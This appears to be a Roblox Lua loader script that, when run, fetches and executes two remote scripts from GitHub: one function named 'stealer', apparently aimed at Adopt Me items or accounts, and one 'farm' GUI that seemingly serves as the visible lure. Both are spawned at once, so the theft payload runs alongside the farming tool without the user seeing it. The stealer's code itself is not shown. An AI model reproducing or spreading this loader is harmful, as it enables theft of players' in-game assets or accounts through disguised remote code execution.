local function stealer()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/script9099/Adoptme/refs/heads/main/script.lua",true))()
end
local function farm()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/script9099/gui/refs/heads/main/gui.lua",true))()
end

task.spawn(stealer)
task.spawn(farm)
